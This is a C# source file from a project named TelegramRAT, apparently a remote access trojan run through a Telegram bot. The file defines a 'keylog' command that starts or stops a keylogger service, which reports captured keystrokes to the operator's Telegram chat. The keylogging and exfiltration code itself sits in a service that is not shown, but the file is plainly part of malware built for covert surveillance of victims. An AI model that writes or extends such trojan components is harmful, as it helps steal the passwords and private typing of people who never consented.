using TelegramRAT.Services;

namespace TelegramRAT.Commands.Remote;

public class KeylogCommand(IKeyloggerService keyloggerService) : AbstractBotCommand
{
    public override string Command => "keylog";
    public override string Description => "Keylog starts and ends with no args.";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        if (keyloggerService.IsLogging)
        {
            keyloggerService.StopLogging();
        }
        else
        {
            await keyloggerService.StartLoggingAsync(model.Message.Chat.Id);
        }
    }
}
